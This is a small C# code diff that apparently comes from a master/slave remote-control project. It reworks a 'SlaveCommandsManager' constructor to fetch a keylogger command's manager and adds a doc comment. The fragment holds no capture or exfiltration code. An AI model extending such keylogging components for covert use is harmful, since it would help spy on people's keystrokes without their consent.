@@ -10,7 +10,10 @@ namespace Slave.Commands.Core
     {
         KeyLoggerManager keyLoggerManager { get; }
 
-        public SlaveCommandsManager(GlobalNetworkManager networkManager) : base(networkManager)
+        /// <summary>
+        /// Constructor, get keylogger ICommand instance
+        /// </summary>
+        public SlaveCommandsManager()
         {
             keyLoggerManager = ((KeyLoggerCommand)GetCommandByName("keylogger")).keyLoggerManager;
         }
